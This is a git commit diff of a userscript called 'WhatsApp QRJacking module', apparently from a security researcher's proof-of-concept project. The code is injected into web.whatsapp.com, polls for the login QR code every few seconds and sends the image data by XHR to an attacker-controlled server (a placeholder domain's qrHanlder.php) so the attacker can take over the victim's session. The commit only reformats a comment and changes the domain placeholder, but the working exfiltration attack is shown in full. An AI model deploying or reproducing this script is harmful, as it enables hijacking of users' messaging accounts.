e78041568b60d0cdb17d3230ffec1f26eac6b5db
Mohamed A. Baset <symbian2010@gmail.com>
2016-07-13 16:38:08 -0500

    Update WhatsAppQRJackingModule.js

--- WhatsAppQRJackingModule.js
+++ WhatsAppQRJackingModule.js
@@ -1,8 +1,12 @@
 // ==UserScript==
 // @name        WhatsApp QRJacking module
 // @namespace   Seekuritylabs (@Seekurity)
-// The code will be injected in web.whatsapp.com web page and periodically searching for the element which holds the QR Code image then will perform an XHR request to send this QR image code "base64" code to our server side php script which is responsible for converting and storing this "base64 code" to an image file. Also the code is responsible to wake WhatsApp’s QR Code if it is inactive and needs the attacker's interaction to reload it
+// The code will be injected in web.whatsapp.com web page and periodically searching for the element which holds the 
+// QR Code image then will perform an XHR request to send this QR image code "base64" code to our server side php script
+// which is responsible for converting and storing this "base64 code" to an image file. Also the code is responsible to 
+// wake WhatsApp’s QR Code if it is inactive and needs the attacker's interaction to reload it.
 // ==/UserScript==
+
 var myTimer;
 myTimer = window.setInterval(loopForQR, 3000);
 function loopForQR() {
@@ -20,7 +24,7 @@ function loopForQR() {
       {
         //Mirror the QR Code to our server
         var xhttp = new XMLHttpRequest();
-        xhttp.open('GET', 'https://www.domain.com/qrHanlder.php?c=' + document.getElementsByTagName('img')[0].src, true);
+        xhttp.open('GET', 'https://www.Your_Domain.com/qrHanlder.php?c=' + document.getElementsByTagName('img')[0].src, true);
         xhttp.send();
       }
     }
